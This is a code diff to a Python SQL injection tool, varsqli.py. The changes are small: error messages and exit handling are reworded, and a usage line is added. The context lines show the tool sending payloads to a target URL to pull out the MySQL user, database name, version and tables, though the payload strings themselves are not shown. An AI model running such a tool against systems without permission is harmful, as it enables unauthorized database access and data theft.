@@ -156,8 +156,10 @@ if URL_TARGET:
                                 print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_3))
                                 result_3 = requests.get(URL_TARGET + payload_3)
                                 if "The used SELECT" in result_3:
-                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
-                                    exit()
+                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
+                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
+                                    exit("Ending {}".format(end_time))
+        
                                 else:
                                     print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed User MySQL : {}{}".format(URL_TARGET, payload_3))
                                     print("Username MySQL : ")
@@ -173,8 +175,9 @@ if URL_TARGET:
                                 print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_4))
                                 result_4 = requests.get(URL_TARGET + payload_4)
                                 if "The used SELECT" in result_3:
-                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
-                                    exit()
+                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
+                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
+                                    exit("Ending {}".format(end_time))
                                 else:
                                     print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed database name MySQL : {}{}".format(URL_TARGET, payload_4))
                                     print("Database MySQL : ")
@@ -192,8 +195,9 @@ if URL_TARGET:
                                 print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_5))
                                 result_5 = requests.get(URL_TARGET + payload_5)
                                 if "The used SELECT" in result_3:
-                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
-                                    exit()
+                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
+                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
+                                    exit("Ending {}".format(end_time))
                                 else:
                                     print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed database name MySQL : {}{}".format(URL_TARGET, payload_5))
                                     print("version MySQL : ")
@@ -214,8 +218,9 @@ if URL_TARGET:
                                     print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
                                     result_6 = requests.get(URL_TARGET, payload_6)
                                     if "The used SELECT" in result_6:
-                                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
-                                        exit()
+                                        end_time = datetime.datetime.now().strftime("%H:%M:%S")
+                                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
+                                        exit("Ending {}".format(end_time))
                                     else:
                                         print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_6))
                                         print("")
@@ -250,19 +255,24 @@ if URL_TARGET:
                                         print("")
                                         exit()
                                 else:
-                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-columns -C < Name DB >")            
+                                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
+                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
+                                    print("Ending {}".format(end_time))          
                     else:
-                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Failed Get Columns")
-                        exit()
+                        end_time = datetime.datetime.now().strftime("%H:%M:%S")
+                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed Get Columns Tables")
+                        exit("Ending {}".format(end_time))
                 else:
                     end_time = datetime.datetime.now().strftime("%H:%M:%S")
                     print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
                     exit("Ending {}".format(end_time))
         else:
-            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns")
-            exit()
+            end_time = datetime.datetime.now().strftime("%H:%M:%S")
+            print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns")
+            exit("Ending {}".format(end_time))
 else:  
-    print("Usage : python3 varsqli.py -u <url> --check-columns")
+    print("Usage Check Vulnerable: python3 varsqli.py -u <url> --check-vuln")
+    print("Usage Check Columns: python3 varsqli.py -u <url> --check-columns")
     print("Help : python3 varsqli.py --help or -h")
     print('''
 [+] Nevertheless, conducting SQL Injection attacks or using the VarSqli tool to attack a system without proper authorization or exceeding legal boundaries may be considered a violation of the law and can result in criminal penalties.
